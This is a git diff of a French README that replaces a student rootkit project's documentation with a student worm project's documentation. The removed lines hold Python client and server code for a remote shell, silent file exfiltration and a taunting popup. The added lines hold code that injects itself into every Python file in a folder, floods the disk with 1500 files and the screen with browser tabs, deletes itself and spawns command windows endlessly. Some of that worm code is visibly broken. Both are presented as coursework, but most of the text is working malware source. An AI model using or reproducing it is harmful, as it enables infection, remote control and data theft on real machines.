@@ -1,353 +1,157 @@
-# Rootkit-Python-IPSSI
+# Ver de 0xM@rt
 
-<!-- Image centrée -->
+[![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)
 
-<div align="center">
+Dans le cadre de ma formation j'ai du développer un Ver
 
-![CAPTURE](https://zupimages.net/up/22/48/9z79.png)
-
-</div>
-
-<!-- --------------------------- -->
+le but du Ver informatique et de se reproduit sur plusieurs ordinateurs en utilisant un réseau informatique. 
 
 
-**Rootkit-Python-IPSSI** a été réalisé dans le cadre pédagogique de l'IPSSI avec un projet sur 1,5 jours. 
+## Pour commencer
 
->Un rootkit est un package de logiciels malveillants conçu pour permettre à un intrus d'obtenir un accès non autorisé à un ordinateur ou à un réseau. **Il permet une exécution de code à distance.**
-
-
-# Prérequis
-- Visual studio code
-
-- Python3
-
-- Connaissances basique / intermédiaire en Python
-
-Il est recommandé d'exécuter ce programme dans un environnement virtuel, il est possible d'en mettre un en place à l'aide des logiciels suivants : 
-- Virtualbox --> Sur une VM Windows / Linux
-- VMWare workstation pro --> Sur une VM Windows / Linux
-- ...
-
-# Description du projet
-
-### Architecture du projet 
-
-Le projet repose sur 2 fichiers Python et 1 fichier de test : 
-
-- ```Client-Victime.py``` --> Qui contient le code client qui est a déployer sur la victime souhaitée qui écoute sur un port.
-
-- ```Serveur-Attaquant.py``` --> Qui contient le code serveur ( attaquant ) qui ouvrira connection TCP.
-
-- ```test.txt``` --> Pour tester l'exfiltration de fichiers. ( a placer quelque part sur le système )
-
-### Fonctionnement du projet
-
-Le projet se passe en plusieurs étapes :
-
-1) Exécution du code sur la victime
-
-2) Exécution du code sur le serveur ce qui initialise une connexion TCP entre le serveur et le client ( pour la victime, l'exécution est transparante )
-
-3) Un shell sur le serveur attaquant s'ouvrira et permettra **de saisir des commandes**
-
-Plusieurs commandes sont possibles depuis le serveur attaquant : 
-- **shell** : Pour avoir accès au shell de la victime
-- **exit** : Arrête le malware coté victime
-- **recv_archive** : Exfiltre des fichiers depuis la victime en les copiant, la victime ne voit rien.
-- **help** : Liste les commandes possibles
-- **popup** : Déclanche une popup chez la victime
-
-### Mise en réseau
-Ce projet se déroule entièrement en **local**.
-
-# Avancement du projet
-
-- [x] Création du shell côté attaquant
-- [x] Mise en place de l'exfiltration de fichiers de la victime
-- [x] Mise en place de l'exécution du shell de la victime depuis l'attaquant
-- [x] Mise en place d'une commande custom qui lance une POP-UP sur le client
-- [ ] Amélioration de l'interface shell côté attaquant pour proposer une solution interactive 
-- [ ] Mineur de cryptomonnaies en fond
+Faite attention ce logiciel a été créé dans le but d'apprentissage il ne faut pas l'utiliser a des fin malvaillante  
 
 
-### Mise en place de l'environement de travail
+### Pré-requis
 
-Il est conseillé, pour travailler dans de bonnes conditions, d’ouvrir un **répertoire de travail** ( sur le bureau ou autre ) sur Visual Studio Code
+Il faut executer le fichier ver.py et avoir un dossier test ou le vers pourras ce dupliquer.
 
-Une fois le répertoire créé, dans visual studio code il faut cliquer sur ```Fichier``` → ```Ouvrir le dossier```
 
-Une fois cette étape réalisée il suffit d'importer les fichiers .py dans le répertoire de travail et l'exécution est désormait possible
+### Installation
 
-# Explications sur le code
+* _Pour_ _Windows_ :
 
-## Code serveur
+  Pour installer python il faut se rendre sur https://www.python.org/downloads/
 
-### Fonctions de la partie serveur
-L'objectif ici est de réunir les fonctions dans une classe, les classes sont un moyen de réunir des données et des fonctionnalités.
+* _Pour_ _Ubuntu_ :
+
+  Pour installer python il faut utiliser la commande sudo apt-get install python
+
+## Démarrage
+
+Pour lancer le logiciel il faut juste taper *Python3 virus.py* sur la machine a infecter
+
+
+## Explication du code 
+
+
+* _Pour_ _virus.py_ :
+
+--------------------------Les imports---------------------
+
+Sys fournit un accès à certaines variables utilisées et maintenues par l'interpréteur
+
+glob recherche tous les chemins correspondant à un motif particulier selon les règles utilisées par le shell Unix
+
+itertools fonctions créant des itérateurs pour boucler efficacement
+
+subeprocess permet de lancer de nouveaux processus
+
+time permet fournir différentes fonctions liées au temps 
+
+webbrowser permet d'intéragir avec les navigateurs web 
+
+
+----------------------Traitement ------------------------
+
+Tout d'abords nous avons des commentaires # VIRUS SAYS HI! et # VIRUS SAYS BYE! qui sont utile pour délimité les parties du code pour la réplication
 
 ```python
-class Shell:
-    def...
-```
-Lors de la déinition des méthodes de classes, il est important d'indiquer explicitement **self** comme premier argument de chaque méthode, y compris **init**. Cela permet d'initialiser la classe
+#Le virus charge son propre code
+virus_code = []
+with open(sys.argv[0], 'r') as f:
+    lines = f.readlines()
 
-```python
-def __init__(self, SHELL_PYTHON):
-    self.SHELL_BT = SHELL_PYTHON
-```
-La première fonction **verification** permet de définir les commandes côté attaquant, afin de contrôler la victime, 
-
->Pour rappel il y a 5 commandes :
->- **shell** : Pour avoir accès au shell de la victime
->- **exit** : Arrête le malware coté victime
->- **recv_archive** : Exfiltre des fichiers depuis la victime en les copiant, la victime ne voit rien.
->- **help** : Liste les commandes possibles
->- **popup** : Déclanche une popup chez la victime
-
-```python
-def verifications(SHELL_PYTHON):
-    verifications = ["shell", "exit", "recv_archive", "help","popup"]
-    #Shell : Pour avoir accès à la shell de la victime
-    if(SHELL_PYTHON == verifications[0]):
-        print("Exécution du shell côté client")
-        while True:
-            shell = Shell.command()
-            if shell == "exit":
-                break  
-    #Exit : Pour arrêter le malware coté victime 
-    if(SHELL_PYTHON == verifications[1]):
-        print("Connexion fermée côté client")
-        conn.send("exit".encode())
-        conn.close()
-        s.close()
-        exit()
-    #Recv archive : Pour télécharger des fichiers depuis la victime.
-    if(verifications[2] in SHELL_PYTHON):
-        print("Téléchargement des fichiers depuis la victime...")
-        Shell.recv_archive(SHELL_PYTHON)
-    if(not SHELL_PYTHON in verifications):
-        if(verifications[2] in SHELL_PYTHON):
-            return(" ")
-    os.system(SHELL_PYTHON)
-    print("\n")
-    #Help : lister les commandes possibles
-    if(SHELL_PYTHON == verifications[3]):
-        print("help")
-    #Popupclient : Affiche une popup sur l'ordinateur cible
-    if(SHELL_PYTHON == verifications[4]):
-        conn.send("popup".encode())
-        print("Popup envoyée au client")
-```
-
-La seconde fonction **home** permet envoie l'instruction 'home' à la victime qui l'interprète avec une fonction dans son code, renverra en réponse le chemin du répertoire actuel via le socket conn.
-
-```python
-def home():
-    conn.send("home".encode())
-    HOME = conn.recv(1024).decode("latin1")
-    return(HOME)
-```
-
-La troisième fonction **command** permet, dans l'ordre :
-
-- De demander au code de la victime le répertoire actuel
-- D'afficher un prompt à l'attaquant indiquant le répertoire d'exécution cible
-- De vérifier si l'attaquant a saisi exit et retourne exit ce qui quittera le shell
-- D'envoyer le mot command et attend 1 seconde
-- D'envoyer la commmande saisie par l'attaquant
-- De recevoir la réponse de la victime
-
-```python
-def command():
-    # Demande au code de la victime le répertoire actuel
-    HOME = Shell.home()
-    # Afficher un prompt à l'attaquant indiquant le répertoire d'exécution cible
-    SHELL = str(input("%s>> "%(HOME)))
-    # Vérifier si l'attaquant a saisi exit et retourne exit ce qui quittera le shell
-    if(SHELL == "exit"):
-        SHELL = ""
-        return("exit")
-    # Envoyer le mot command et attend 1 seconde
-    conn.send("command".encode())
-    sleep(1)
-    # Envoyer la commmande saisie par l'attaquant
-    conn.send(SHELL.encode())
-    # Recevoir la réponse de la victime
-    print(conn.recv(1024).decode("latin1"))
-```
-La quatrième fonction **recv_archive** permet l'exfiltration de données :
-
-```python
-#Recv Archive Serveur
-def recv_archive(data):
-    #Exfiltration du fichier
-    f = open (r"C:\Users\ADM_VM01\Desktop\TP2\FichierExfiltré.txt", 'wb')
-    conn.send("rcv".encode())
-    s.listen(1)
-    #Téléchargement de ce dernier
-    data = conn.recv(1024)
-    f.write(data)
-    f.close()
-    print("Téléchargement terminé")
-    conn.shutdown(2)
-    conn.close()
-```
-
-### Traitement de la partie serveur
+EstInfecte = False
+for line in lines:
+    if line == "# VIRUS SAYS HI!":
+        EstInfecte = True
+    if not EstInfecte:
+        virus_code.append(line)
+    if line == "# VIRUS SAYS BYE!\n":
+        break
+ ```
  
- La première partie du traitement permet de définir les paramètres de base du programme ( port d'écoute, IP ) et initialise également la connexion
+ 
+Le code suivant permet d'injecter du code dans les fichier en ;py et .pyw
+ 
+```python
+python_files = glob.glob('*.py') + glob.glob('*.pyw')
+
+for file in python_files:
+    with open(file, 'r') as f:
+        file_code = f.readlines()
+    
+    infected = False
+    
+    # ne pas injecter le code s'il y'a le VIRUS SAYS HI
+    for line in file_code:
+        if line == "# VIRUS SAYS HI!\n":
+            infected = True
+            break
+    
+    # injecter le code s'il n'y'a pas le VIRUS SAYS HI
+    if not infected:
+        final_code = []
+        final_code.extend(virus_code)
+        final_code.extend('\n')
+        final_code.extend(file_code)
+        
+        with open(file, 'w') as f:
+            f.writelines(final_code)
+            
+print ("Virus en cours d'execution")
+```
+--------------------Ajout personnel dans le virus---------------------
+
+
+Création de plusieurs fichier txt et affichage de dans un navigateur de photo de chat
 
 ```python
-#Gestion des sockets pour la connexion réseau
-IP = socket.gethostbyname("localhost")
-PORT = 80
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((IP, PORT))
-s.listen(10)
-conn, cliente = s.accept()
-welcome = conn.recv(1024)
-print(welcome.decode("latin1"))
+path = str(os.path.join(r"C:\Users\User\Documents\Virus"))
+print(f)
+
+
+#------------------ création de plein de fichiers texte dans un dossier et affichage de plein de photo de chat sur le navigateur------------------------------
+for t in range(1500):
+    file = open(path +"\\test_%d.txt" %t , "w")
+    file.write("let's go !!!%d"%t)
+    file.close()
+    
+    webbrowser.open_new("https://genrandom.com/cats/")
+    [''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=1)]
+    
+    
 ```
 
-La seconde partie du traitement permet d'initialiser le shell interactif avec l'utilisateur ( avec l'interfacing compris )
 
-Lorsque ```CTRL+C``` est déclanché, cela coupe le shell.
+Le virus ce supprime tout seul après execution
+```python
+#-----------------------------------auto supression du virus---------------------------
+file_path = r"C:\Users\User\Documents\Virus\virus.py"
+
+if os.path.isfile(file_path):
+os.remove(file_path)
+print("fichier supprimé")
+```
+
+Le virus lance des cmd en boucle 
 
 ```python
+#--------------------------------Boucle infini qui lance des CMD------------------------------
 while True:
-    try:
-        shell_btnt = str(input("\033[31m\033[1m[Commande]\033[31m >>\033[1;32m "))
-        print("")
-        print("Commandes possibles : shell, exit, recv_archive, help, popup")
-        print("")
-        Shell.verifications(shell_btnt)
-    except KeyboardInterrupt:
-        conn.close()
-        s.close()
-        exit()
-```
+    os.system('start cmd')
 
-## Code client
+# VIRUS SAYS BYE!\n
 
-### Fonctions de  la partie client 
-
-L'objectif ici est de réunir les fonctions dans une classe, les classes sont un moyen de réunir des données et des fonctionnalités.
-
-```python
-class Client:
-    def...
-```
-
-Lors de la déinition des méthodes de classes, il est important d'indiquer explicitement **self** comme premier argument de chaque méthode, y compris **init**. Cela permet d'initialiser la classe.
-
-```python
-def __init__(self, DATA):
-    self.DATA = DATA
-```
-La première fonction **verification** permet d'exécuter les commandes côté victime.
-
->Pour rappel il y a 4 commandes :
->- **shell** : Pour avoir accès au shell de la victime
->- **exit** : Arrête le malware coté victime
->- **recv_archive** : Exfiltre des fichiers depuis la victime en les copiant, la victime ne voit rien.
->- **help** : Liste les commandes possibles
-
-```python
-def verifications(DATA):
-    #Exécute les commandes
-    if(DATA == str.encode("command")):
-        command = s.recv(1024)
-        Client.command(command.decode("latin1"))
-
-    #Shell : Pour avoir accès à la shell de la victime
-    if(DATA == str.encode("home")):
-        s.send(os.getcwd().encode())
-
-    #Exit : Pour arrêter le malware coté victime 
-    if(DATA == str.encode("exit")):
-        s.close()
-        exit()
-    #Recv archive : Pour télécharger des fichiers depuis la victime.
-    if(DATA == str.encode("filesend")):
-        Client.send_archive(DATA)
-```
-
-La première fonction **send_archive** permet d'envoyer les fichiers spécifiés par l'attaquant.
-
-```python
-    #Recv Archive Client
-def send_archive(DATA):
-    file = r"C:\Users\ADM_VM01\Documents\test.txt"
-    filetosend = open(file, "rb")
-    #Envoi des données
-    data = filetosend.read(1024)
-    print("Sending...")
-    print(data)
-    s.send(data)
-    filetosend.close()
-    s.send(b"DONE")
-    print("Done Sending.")
-    print(s.recv(1024))
-    s.shutdown(2)
-    s.close()
-```
-
-La troisième fonction **popupclient** permet l'affichage d'une popup côté client, l'action déclanché par l'attaquant. L'affichage se réalise 5 fois.
-
-```python
-    #Popupclient client
-def popupclient(DATA):
-    for i in range (5):
-        messagebox.showerror("R O O T K I T", "J'ai le contrôle de votre PC")
+time.sleep(10)
 ```
 
 
-La quatrième fonction **command** permet de traiter l'ordre envoyé par l'attaquant. DATA est renvoyé à l'attaquant.
 
-```python
-def command(DATA):
-    sub = subprocess.Popen(DATA, shell=True, stdout=subprocess.PIPE,
-    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    output = sub.stderr.read()+sub.stdout.read()
-    s.send(output)
-```
+## Auteurs
+Listez le(s) auteur(s) du projet ici !
+* **0xM@rt** _alias_ [@0xM@rt](https://github.com/0xMart)
 
-### Traitement de la partie client
 
- La première partie du traitement permet de définir les paramètres de base du programme ( port d'écoute, IP ) et initialise également la connexion avec confirmation.
-```python
-IP = socket.gethostbyname("localhost")
-PORT = 80
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((IP, int(PORT)))
-s.send("Connexion établie avec le client.".encode("latin1"))
-```
 
-Permet d'initialiser la réception des mots envoyés par l'attaquant.
-
-Lorsque ```CTRL+C``` est déclanché, cela coupe le shell.
-
-```python
-IP = socket.gethostbyname("localhost")
-PORT = 80
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((IP, int(PORT)))
-s.send("\n".encode("latin1"))
-s.send("Connexion établie avec le client.".encode("latin1"))
-s.send("\n".encode("latin1"))
-s.send("\n".encode("latin1"))
-s.send("Commandes possibles : shell, exit, recv_archive, help, popup".encode("latin1"))
-s.send("\n".encode("latin1"))
-s.send("CTRL+C pour exit le shell".encode("latin1"))
-s.send("\n".encode("latin1"))
-```
-
-# Auteur
-
-Auteur du projet : Jean O.
-
-Version stable : ```1.0```
-
-# Licence
-
-Ce projet est à but éducatif, il n'est soumis à aucune licences.
